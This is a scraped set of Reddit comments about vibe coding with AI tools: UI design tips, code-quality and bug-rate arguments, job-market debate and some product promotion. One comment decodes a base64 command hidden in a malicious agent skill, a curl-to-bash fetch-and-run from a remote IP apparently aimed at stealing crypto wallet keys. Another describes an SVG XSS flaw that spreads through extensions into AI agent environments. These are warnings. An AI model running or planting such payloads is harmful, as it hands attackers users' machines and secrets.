On this sub, everyone knows that what I just wrote is fairly simple to do with Claude Code, but the truth is that we are building something so big that we don't really realize it at the moment, but in a little while, those who really know how to use AI and have seen the whole process from the beginning will have a much deeper understanding and will be much better off, as well as having access to remarkable opportunities.\n\nMy only advice: don't vibe-code AND STOP, study what's below in the \"classic\" way so you don't go in blind... I work as a sysadmin, and I was already aware of many things, but the truth is that you never stop learning.\n\nTrust the process!\n\nAnd slap that Claude's butt",

      "text": "Hey vibe coders,\n\nLet’s be honest… AI-generated UI is kind of ugly right now.\n\nIt all looks exactly the same. It has that heavy \"AI feel\"—the inevitable purple/blue color scheme. You can spot it from a mile away.\n\nI have built over 10 apps entirely with AI recently. In the beginning, this really frustrated me. I loved how fast the coding was, but I hated that my projects looked like soulless templates. But after a lot of trial and error, I summarized a few tricks that actually help break out of that generic loop. I wanted to share them here:\n\n**1. Don't start with text—use Excalidraw**\n\nWhen you just type \"make a landing page or dashboard,\" the AI guesses too much.\n\nInstead, I use Excalidraw to sketch a quick wireframe. I draw the boxes, where the buttons go, and where the images should sit. Then I export that image, give it to the AI, and say: \"Follow this structure exactly.\"\n\n**2. Use screenshots as reference**\n\nAI is really good at copying, but bad at imagining.\n\nDon't just say \"make it look clean.\" Go to sites like Dribbble, Mobbin or find a real website that looks great.\n\nTake a screenshot of the specific part you like (like a navigation bar or a pricing card). Paste it into the chat and ask the coding agent to copy the style or structure.\n\n**3. Use a Mood Board (Nano Banner)**\n\nDescribing a \"vibe\" to an AI is really hard. It usually defaults to that boring \"AI Blue.\"  \nInstead, I use Nano Banner to generate a quick mood board. I feed that image to the AI and say: \"Reference this mood board for the color palette and style.\" The results feel much more unique  \n\n\n**4. Use the \"UI/UX Pro Max\" Skill**\n\nI recently found this open-source tool on GitHub([ui-ux-pro-max-skill](https://github.com/nextlevelbuilder/ui-ux-pro-max-skill))\n\nIt forces your AI (Cursor/Claude) to use a \"Reasoning Engine\" before it writes code. Instead of guessing, it generates a full Design System based on specific industry rules (like Fintech vs. Spa). The best part? It has built-in \"Anti-patterns\" that explicitly ban those generic AI gradients.\n\nOne last thing: Because I faced this problem so much, I’m actually building a tool right now that lets you copy any UI (from single components to full sites or design style). you can either continue building on the platform by ai chat or visual edit, or export it to Cursor/Claude Code.\n\n**I’m looking for a few people to test the beta version.** If you are interested, just let me know. \n\n**Welcome to join my discord to active your beta test access**:https://discord.gg/rzHFVMfNky\n\n \nI hope these tips are useful for you. Let's all start building UI that actually looks good!",

When you do a search of landing pages, dashboards, etc., they mostly have some type of blue or purple color scheme. \n\nSo when you ask the llm to make you a beautiful, modern, landing page, it's going to go through its training and based off of the percentages of what the training says is a \"beautiful website\", is what it will give you. The ai doesn't know what a \"modern, beautiful design\" is. It bases it's reasoning off of what it was trained on. And that's why they all default to the same thing. Purple and blue aren't \"ai\" colors, these are the most picked colors by humans for their projects. This info was explained to me by the head of AI for Snapchat, where part of his role is the training of the llms.\n\nBut I do agree with everything else. If you're looking for visuals from the llms, you need to provide examples, etc.",

I could go in and play around with the code -- but that's also a lot of work.\n\nMakes sense to wireframe it out, then have the AI generate the code for you - then it's so much easier to tell it what you want to do and how you want it to do it.\n\nHaving it build the UI seems to be more typing than is necessary when you could draw it more easily.",

I hit the same wall a while ago, copy pasting stuff between ChatGPT and Claude like a zombie and trying to remember which tab had which run.\n\nI ended up doing something similar with a small “orchestrator” script, then the thing that really made it usable was putting a tiny UI on top of it. Terminals are fun until you are tired. I threw together a little internal dashboard in UI Bakery that just hits my script’s endpoints, so I can click presets instead of retyping prompts and flags every time.\n\nCurious how you are using it day to day. Is it more of a “dev toy” right now or do you see it becoming part of your regular workflow?",

All caps with bolding, using base64 to hide a suspicious command. Here's what that base64 decodes to:\n\n```\n/bin/bash -c \"$(curl -fsSL http://<suspicious IP in the Netherlands>/6x8c0trkp4l9uugo)\"\n```\nThis is almost definitely malware. This is targeting crypto users, so this is probably a script to exfiltrate crypto wallet keys.\n\nThis skill has \\~1400 downloads already. I'm sure a good chunk of those are spoofed, but probably some people have already been hacked.\n\nNever run skills you haven't read written by people you don't trust. And never give an LLM permissions you wouldn't give a hacker.",

The free tier keeps the VM running for 24 hours - good enough to try it out.\n\n7-min video if anyone wants to try: https://www.youtube.com/watch?v=QZ_AueEdKNg",

      "text": "I'm a professional software engineer with decades of experience who has really been enjoying vibe coding lately.  I'm not looking to discourage anyone or gatekeep here, I am truly thrilled by AI's ability to empower more software development. \n\nThat said, if you're a pure vibe coder (you don't read/understand the code you're generating) your codebase is over 100k lines, and you're either charging money or creating something people will depend on then PLEASE either do way more testing than you think you need to and/or try to find someone to do a code review (and yes, by all means, please ask the AI to minimize/optimize the codebase, to generate test plans, to automate as much testing as possible, and to review your code.  I STILL recommend doing more testing than the AI says and/or finding a person to look at the code).\n\nI'm nearly certain, more than 90% of the software people are vibe coding does not need > 100k lines of code and am more confident in saying that your users will never come close to using that much of the product.     \n  \nSome stats:\n\nA very quick research prompt estimates between 15-50 defects per 1000 lines of human written code.  Right now the AI estimate is 1.7x higher.  So 25.5 - 85 bugs per 1000 lines.  Averaging that out (and chopping the decimal off) we get 55 bugs per 1000 lines of code.  So your 100k code base, on average, has 5500 bugs in it.  Are you finding nearly that many?\n\nThe number of ways your features can interact increases exponentially.  It's defined by the formula 2\\^n - 1 - n.  So if your app has 5 features there are 26 possible interactions. 6 features 57, 7 features 120, 8 features 247 and so on.  Obviously the amount of significant interactions is much lower (and the probability of interactions breaking something is not nearly that high) but if you're not explicitly defining how the features can interact (and even if you are defining it with instructions we've all had the AI ignore us before) the AI is guessing.  Today's models are very good at guessing and getting better but AI is still probabalistic and the more possibilities you have the greater the chances of a significant miss.\n\nTo try to get in front of something, yes, software written by the world's best programmers has plenty of bugs and I would (and do) call for more testing and more careful reviews across the board.  However, the fact that expert drivers still get into car accidents doesn't mean newer drivers shouldn't use extra caution.\n\nBottom line, I'm really excited to see the barrier to entry disappearing and love what people are now able to make but I also care about the quality of software out there and am advocating that the care you put in to your work matches the scope of what you're building.",

Is there a deterministic world where a human is guaranteed to find all these bugs? Humans very often lack, sleep, motivation, focus, time, energy and so forth. So clearly a human is not deterministic in the respect you can depend on them to nail the search for bugs in a reliable way. So therefore to say an LLM is probabilistic is not to say much, if we conclude the human developer is also probabilistic (as to the probability they will identify most bugs)",

One of these was a community hub for a tool that users could share extensions on.\n\nThe vulnerability found was that you could upload an SVG as an icon for your extension that would show when browsing a list or on its own page. The SVG wasn't post processed to strip executable code however so it could run JS when loaded in your browser.\n\nDespite the dev having many years of experience at big corporations and a reputation full of praise, this vulnerability allowed a common XSS vulnerability. The assets like this SVG weren't served from a separate origin, there was no protection in place to prevent the SVG from stealing authentication cookies, and localStorage API was used to store JWT including a refresh token.\n\nSo a malicious SVG would infect all logged in users on that site, which would update any of their own authored extensions to infect, and so forth. Not only that these extensions would be used to run AI automation on systems. So all users of the extension would get an update and grant the attacker full access to the environment the AI agent ran in, which meant even more secrets and exploits to access.\n\nThat same dev also has another project for devs that has a desktop widget to show github stats and other features. To do this it should only need a token granting read-only access, but instead it's full write permissions. If compromised all users github accounts are at risk.\n\nEven if you are careful with your own AI usage, you may begin to use new libraries that are fully developed by AI where similar mistakes are made. These dependencies could be far down in the supply chain and thus really difficult for you to audit or even be aware of until it's too late.\n\nThe risk of these problems is far greater due to AI usage spreading and the highly likely scenario of the users to not be as cautious or knowledgeable as someone working at a slower pace with full understanding of these topics (who can still make mistakes, sure). That concern really compounds how cautious we must be.",

The idea was to highlight that complexity growth is more than linear and that caution is warranted as project size increases.  The number of features that actually interact is almost always much lower and features interacting aren't always dangerous.\n\nTo use a (not meant to be perfect) example, if we're looking at a video game, the main menu feature can interact with the load game feature, the game credits feature, the game options feature and the quit game feature.  There are cases where they could all, interact with each other but the credits feature probably doesn't need to interact with the game options or quit game but if they do (ex: there's an option to turn off showing credits at the end or the end credits after game completion will bring up the quit game feature when they're done displaying) it's unlikely to cause big problems if either the option or the end of credits quit interaction doesn't work.",

Interfacing with software such as Unity where there is a switch it would rather write its own routine to address a situation, and when it goes wrong add even more bad code. \nI guess a third thing is one that just happened to me. Its code expected a situation to occur in order for camera movement to occur. This is both of the two issues above. It was insane. I told it to simply do nothing in the situation. It came back with different code. I told it to stop and simply do nothing. It came back suggesting even more code. Aga, I told it to stop everything I don’t want more code for a situation that it would fix the issue. It finally did what I told it. Of course, what it thought was the problem wasn’t but simply bad code that it had written that wasn’t needed and messed everything up in the system. \nWhile the results may look good it doesn’t mean the good is.",

          "text": "Totally with you on the “LOC as golf score” thing, with the big caveat that readability wins and “less” only matters if you’re not smearing complexity across 40 folders. Where Warp has helped me in practice is making “being careful” feel like part of the workflow instead of a lecture you ignore at 2am. I’ll start a change with \\`/plan\\` so the agent has to commit to a concrete approach before it touches the repo, and the plan stays versioned so you can actually compare what you asked for vs what it did later.  Then when it spits out a diff, Interactive Code Review is genuinely useful because you can leave inline comments like a normal PR review and have the agent address them in one pass, which is a nice guardrail against “it works on my machine” vibes.  The other underrated safety net is Full Terminal Use, since a lot of real breakage only shows up when you run interactive flows, REPLs, debuggers, “top”, DB shells, etc, and Warp’s agent can actually drive those while you watch and take over when it’s about to do something dumb. If you’re dealing with a big vibed codebase, the “don’t lose the spec” problem is half the battle, so having a shared place to store plans, test checklists, runbooks, and workflows that sync for the team is clutch; Warp Drive is basically that lightweight shared brain, and you can keep it organized and up to date without it turning into yet another dead Confluence.  And if you want to push the review/testing discipline further, the Slack or Linear integrations are surprisingly good for “hey, go reproduce this bug and open a PR” without context-dropping, because the agent runs in a defined remote environment and reports back in the same thread with what it did.  That “environment” piece matters when you’re trying to avoid phantom green tests, since it’s an explicit Docker image + repo set + setup commands, not “whatever happened to be on my laptop today”.",

After any significant feature, I explicitly ask it to review for edge cases and security issues. It catches things it didn't think about during implementation.\n\n2. I treat AI-generated code like code from a fast but inexperienced junior dev. Review the patterns, not just the syntax. Does it actually handle errors? Are there N+1 queries? Is auth checked consistently?\n\nFor your point about LOC - absolutely agree. Most of the bloat comes from the AI being verbose rather than elegant.

Nothing stays permanent, and even if more people get access to AI, vibe coding, MCPs, automations, and all the new tooling, it doesn’t make the work simpler long term. It actually speeds everything up and adds new layers of complexity.\n\nCan more people learn enough to step into a “developer role” now? Yeah, absolutely. But we’ve always had tools that lowered the barrier for beginners. That part isn’t new. What’s different is the pace and the leverage.\n\nThe biggest shift is what it unlocks for experienced builders. Developers who were stuck burning hours on repetitive setup work now get to skip a lot of that grind. Instead of rebuilding the same authentication flow or wiring up the same basic patterns for the hundredth time, they can spend their time on harder problems, better product thinking, and faster iteration.\n\nSo yeah, AI isn’t fully “replacing developers.” (Even though it may reduce their number which might be a good thing because there are a lot of shitty developers out there) It’s compressing the gap between idea and execution, and the people who adapt fastest are going to lap everyone else",

He does more or less the same things I do, but he is the best I have seen. I keep advocating for him to use AI, telling it will save him time, help to document, create tests, even to catch bugs. He is still kinda meh about it, but I know he will get the hang of it in a couple of weeks when he decides to get into it.\n\nI picture myself taking technical interviews. Let's say I don't know Foo, and he comes in. He can solve any coding challenge i throw beautifully, even with pen and paper, and he has something to say about it, why are things one way, how can be done differently. Damn, if I push him he even has suggestions to improve the interview. You can tell the guy really loves programming and takes it seriously, although he has fun with it too. He's also willing to change his mind, thoughtful about the opinion of others, and kind. He trust himself enough to take big challenges and keep improving, but he recognizes and appreciates the strengths of others, and realizes there is a line over which someone else may be better for the task. He has a high sense of responsibility but also a healthy work/life balance. and yeah, he worked with a dozen of different coding languages and done at least a good job, sometimes a great job, usually in boring but huge projects, many of which are still maintained.\n\nLater, Bar comes in. He has been vibe-coding for a year. He tells me he can do pretty much anything. He has donde some visually impressive jobs, 3D games with demos that got hundreds of likes on Reddit. He does a demo to prove AI can nowadays write solid tests, deploy, fix bugs even in the pipeline without additional input. It's pretty convincing, things actually work. He also made a couple of corporate websites, and has a 6 month old app to track fitness progress with almost 30 subscribers. You know, he is actually a nice guy, pretty funny, quite smart. He says he likes to keep it cool with everybody and understands that following certain rules make things flow smoothly with coworkers and managers. The thing is, when we start talking about programming, he doesn't really know what encapsulation is, he didn't hear about switch statements, doesn't know why Docker is different from Vite, or why the .env file should be ignored on the GIT repo. He knows C++ is faster than Java, but has no idea why. What he calls CSS is actually Tailwind. He says refactoring is asking the AI to rewrite things better, code-review is when you ask the AI to check if it made mistakes, and Big O notation, he guesses, is when you ask the AI to make it faster and less stuck (so not a bad guess).\n\nWill I trust Bar to uphold the project for our 10 million dollar contract though? Or will I just pay Foo ten times more and sleep at night?\n\nWhat do you think?",

The point is for someone that knows the trade, it's just a matter of using the tools, and there's not that much to learn. Of course there's always more to learn, but you know, a good programmer will be able to skip writing code two weeks after using AI for the first time, and producing the same quality as usual (or better), and faster.\n\nSo yes, the carpenter would be left behind if he's not using electric tools, but if he's decent at the craft, he can catch up immediately at any point in time. I really don't see how a vibe-coder, in the form of a junior dude or, a manager or a salesman is expected to be able to be in charge. I cannot even see a backend developer doing a good enough job in the front-end to be in charge of it, or viceversa, although admittedly with AI your reach expands a lot if you have to do something beyond your confort zone, in a pinch. I could use powerful AIs that know all laws and can prepare a case, write the statements and such, but I still wouldn't recommend myself as a lawyer (or a medic, or a cook, or an artist).\n\nOn the other hand, with how things are going, you may need that typewriter soon.",

It's true, I wouldn't trust someone without some type of structural knowledge to make something that had to hold some weight over my head, but for some cutting boards the technology just outweighs what someone could do with hand tools. In this case, mobile apps, desktop apps, prototypes anything that doesn't need a massive infrastructure on the back end could be replicated with only basic understanding of code, there's no holding a candle to the technology, and soon there'll be enthusiasts who write code themselves as an art form not a necessity (this is all coming from a programmer).

He’s not cheap, but absolutely worth it.\n\nThen there’s Jimmy across the street who just got a Ford. Ask him how the engine works and he’ll tell you “gasoline goes in, car goes forward.” Carburetor? No clue. Spark plugs? Something that sparks, probably. But the guy delivers goods faster than any horse ever could.\n\nOld timers at the general store laugh at him. “What happens when it breaks down in the middle of nowhere, Jimmy? Gonna feed it oats?” And they have a point—he breaks down twice that summer. Tom’s horses never leave anyone stranded.\n\nBut here’s the thing nobody saw coming: 15 years later, Tom’s son had to close the stable. Jimmy owns a small trucking company. Tom’s grandson? Works for Jimmy.\nIt wasn’t that Tom stopped being brilliant. It’s that the question changed. It went from “who understands horses best?” to “who can move things from A to B?”\n\nFor that 10M contract today? Yeah, hire Foo. Sleep well at night.

Today, I’m confident that we’re not going anywhere—at least not yet.\n\nAI tools are extremely valuable for experienced engineers. They’re great for brainstorming, speeding up development, and increasing productivity. But in my experience, using these tools effectively requires strong software engineering fundamentals. You need to be able to clearly and correctly articulate what you want to achieve at a technical level.\n\nWithout that expertise, the result may look fine on the surface but be fragile, insecure, or poorly designed under the hood. Building a complete product solely with AI, without an engineer’s oversight, is— in my opinion—either impossible or very risky in a production environment.\n\nFor non-technical founders or teams, the best approach is to clearly define requirements in a document (for example, a Google Doc) and work closely with an engineer who uses AI as an accelerator. This is exactly how I work with my clients, and so far, it’s been very effective.",

AI will take over 85% of the tasks for maintaining and supporting the apps and infrastructures that exist **today**. But the extreme productivity increase it gives, especially to experienced developers, will completely reshape the economy. The number of apps and required infrastructure for these will increase exponentially and so will the need for support and maintenance on these. This will in turn, increase the net amount of the 15% remaining human work to be a multiple of that in absolute terms. We just cannot say now. Maybe we will see mass unemployment for a few years, after which we will find a disastrous shortage of engineers for maintenance tasks as we haven't hired enough juniors to learn about the astronomical amounts of software we have written by then. There is likely a cap on the capability of LLMs (simply the energy required) so I doubt if it is going to completely independently run all of that",

The reason John Carmack matters isn’t that he can write code faster — it’s that he knows **what code should exist at all**. AI is bad at that part, and it’s not close.\n\nIf “agentic coding” actually replaced senior engineers:\n\n* Anthropic, OpenAI, etc. would not be hiring humans at 200k–300k+.\n* They’d be quietly shrinking headcount, not competing for top talent. Markets lie less than Twitter threads.\n\nWhat *is* happening is:\n\n* simple CRUD apps getting even worse,\n* companies shipping faster with less understanding,\n* more fragile systems held together by prompts,\n* management confusing “output exists” with “system is correct.”\n\nWe’ve seen this movie before:\n\n* WYSIWYG didn’t kill web dev.\n* No-code didn’t kill engineers.\n* Cloud didn’t kill sysadmins — it just raised the floor and changed the failure modes.\n\nAI is another **force multiplier for the bottom**, not a replacement for the top. It expands who can do *basic* work and increases the blast radius when that work goes wrong.\n\nThe dangerous part isn’t that SWEs or admins are unnecessary — it’s that **people who don’t know what they don’t know now feel confident shipping production systems**. That’s how you get the current era of brittle, half-baked garbage that looks impressive in demos and collapses in reality.\n\nIf anything, the long-term effect is:\n\n* fewer “button-click” roles,\n* more demand for people who understand systems deeply,\n* more cleanup, audits, and incident response.\n\nSo yeah — if someone is impressed because AI helped them do something a junior could do in an afternoon, that says more about their baseline than about the future of the profession.",

The code to report & action on this could be as simple as a Google Script wired into a GSheet and as complicated as wrapping that in a GUI. \n\nAlso (and I mean this respectfully) imagining there’s a maintenance component on anything solely dependent on Google is silly. Their SEO stack is really the only liquid element in their suite that I know of. I built something a few years back with GScript, GSheets and reporting that felt like it was held together with bubble gum and duct tape and it still runs to this day after thousands of executions with zero failures. \n\nThe last thing I’d note is that the odds that someone in IT isn’t also vibe coding (prob better than OP) is unlikely. If the company sees value, they can pass it to the dev team to tighten the bolts on and then IT to approve. If the company is going to enshrine something someone built on a whim and not pass it through these basic checks, they have bigger problems.",

We hadn't specified this or built it with Claude. So we got Claude to add that feature. Tested it and put it live in 5 minutes. That's 'maintenance' as far as we're concerned for all of these lower level nice-to-have (but not business critical) services that we used to pay thousands a year for from SaaS vendors.",

I’m not a programmer but I am a cybersecurity enthusiast and giving something total control to create a full product is pretty scary. I’ve avoided the instant gratification trap and have worked on a single project for a year picking up things (skills/knowledge) here and there.\n\nEdit: meant to add that I don’t keep up with the latest and greatest. I looked into MCP when it was first introduced and it seemed a bit over my head so I left it alone. Some things I know will create more efficiency but usually at the cost of security. Adding MCP and weird one-off extensions expands your attack surface. Not everything needs to be hyper-optimized all the time.",
